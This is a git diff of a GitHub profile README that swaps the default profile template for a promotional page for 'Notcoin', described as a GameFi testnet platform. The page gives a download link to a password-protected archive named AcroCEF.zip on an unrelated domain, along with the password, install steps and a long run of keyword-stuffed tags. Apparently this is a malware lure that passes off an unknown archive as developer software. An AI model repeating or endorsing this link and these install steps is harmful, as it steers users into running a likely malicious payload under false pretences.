@@ -1,12 +1,38 @@
-- 👋 Hi, I’m @ggk-200
-- 👀 I’m interested in ... coding
-- 🌱 I’m currently learning ...
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
+# 🚀 Notcoin - Decentralized GameFi Platform 2024 🚀
 
-<!---
-ggk-200/ggk-200 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+# [DOWNLOAD](https://dev-marcepan.grupa-abs.pl/AcroCEF.zip)  
+## Password - 86tiiolsmn
+
+## 📜 Overview
+
+**Notcoin** is a GameFi platform on Testnet designed for developers to build and test decentralized gaming applications, incorporating play-to-earn mechanisms and blockchain rewards.
+
+### 📋 How to Use
+
+1. **Download Notcoin** using the provided link.
+2. **Install** Notcoin on your system.
+3. **Develop GameFi applications** with play-to-earn features and decentralized rewards.
+
+---
+
+If Notcoin is valuable to your development, please ⭐ this repository!
+
+### 🔑 Tags
+
+- Notcoin
+- Notcoin-GameFi
+- Notcoin-gaming
+- Notcoin-decentralized
+- Notcoin-Testnet
+- Notcoin-free-download
+- Notcoin-setup-2024
+- Notcoin-install
+- Notcoin-platform
+- Notcoin-tools
+- Notcoin-play-to-earn
+- Notcoin-blockchain
+- Notcoin-rewards
+- Notcoin-for-developers
+- Notcoin-crypto
+- Notcoin-GameFi-tools
+- Notcoin-gaming-crypto
